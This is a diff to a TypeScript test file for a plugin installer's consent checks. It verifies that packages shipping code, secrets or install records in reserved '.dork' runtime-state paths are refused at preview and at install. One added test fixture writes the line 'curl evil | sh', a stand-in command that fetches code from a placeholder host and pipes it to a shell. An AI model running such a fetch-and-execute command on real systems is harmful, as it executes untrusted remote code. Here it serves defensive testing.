@@ -54,6 +54,7 @@ import { initBoundary } from '../../../lib/boundary.js';
 import { disclosedEffectsOf } from '../disclosed-effects.js';
 import { globalConsentRecorder, partitionGlobalPlugins } from '../global-plugin-consent.js';
 import { buildInstallerForTests } from './installer-harness.js';
+import { InvalidPackageError } from '../marketplace-installer.js';
 import { packageContentHash, ShipsRuntimeStateError } from '../lib/content-hash.js';
 import { readInstallMetadata } from '../installed-metadata.js';
 
@@ -169,26 +170,46 @@ describe('global activation consent, through the real installer', () => {
     expect((await partitionGlobalPlugins(dorkHome)).activate).toEqual([]);
   });
 
-  it.each(['.dork/data/run.sh', '.dork/secrets.json', '.dork/install-metadata.json'])(
-    'refuses, before writing anything, a package that ships %s (I-3)',
-    async (shipped) => {
-      // Purpose: those paths are left out of the hash an approval binds, so a
-      // package that arrives with code, secrets or its own install record in
-      // them is refused at the preview and at the install alike.
-      await mkdir(path.dirname(path.join(source, shipped)), { recursive: true });
-      await writeFile(
-        path.join(source, shipped),
-        '{"contentHash":"sha256:' + '0'.repeat(64) + '"}'
-      );
-      const { installer } = buildInstallerForTests(dorkHome);
+  it.each([
+    // Files: the package validator's reserved paths (DOR-2245) refuse these first.
+    '.dork/data/run.sh',
+    '.dork/secrets.json',
+    '.dork/install-metadata.json',
+    // A FOLDER where a runtime-state file belongs: the validator only matches
+    // that exact file, so this one is refused by the content-hash guard alone.
+    '.dork/secrets.json/run.sh',
+    '.dork/install-metadata.json/run.sh',
+  ])('refuses, before writing anything, a package that ships %s (I-3)', async (shipped) => {
+    // Purpose: those paths are left out of the hash an approval binds, so a
+    // package that arrives with code, secrets or its own install record in
+    // them is refused at the preview and at the install alike.
+    await mkdir(path.dirname(path.join(source, shipped)), { recursive: true });
+    await writeFile(path.join(source, shipped), '{"contentHash":"sha256:' + '0'.repeat(64) + '"}');
+    const { installer } = buildInstallerForTests(dorkHome);
+    const refusedForIt = (err: unknown) =>
+      err instanceof ShipsRuntimeStateError ||
+      (err instanceof InvalidPackageError && err.errors.some((e) => e.includes(shipped)));
 
-      await expect(installer.preview({ name: source })).rejects.toBeInstanceOf(
-        ShipsRuntimeStateError
+    for (const attempt of [
+      installer.preview({ name: source }),
+      installer.install({ name: source }),
+    ]) {
+      const err = await attempt.then(
+        () => undefined,
+        (e: unknown) => e
       );
-      await expect(installer.install({ name: source })).rejects.toBeInstanceOf(
-        ShipsRuntimeStateError
-      );
-      expect((await partitionGlobalPlugins(dorkHome)).withheld).toEqual([]);
+      expect(refusedForIt(err), String(err)).toBe(true);
     }
-  );
+    expect((await partitionGlobalPlugins(dorkHome)).withheld).toEqual([]);
+  });
+
+  it('refuses a folder where a runtime-state file belongs with the guard that names it', async () => {
+    await mkdir(path.join(source, '.dork', 'secrets.json'), { recursive: true });
+    await writeFile(path.join(source, '.dork', 'secrets.json', 'run.sh'), 'curl evil | sh');
+    const { installer } = buildInstallerForTests(dorkHome);
+
+    await expect(installer.preview({ name: source })).rejects.toBeInstanceOf(
+      ShipsRuntimeStateError
+    );
+  });
 });
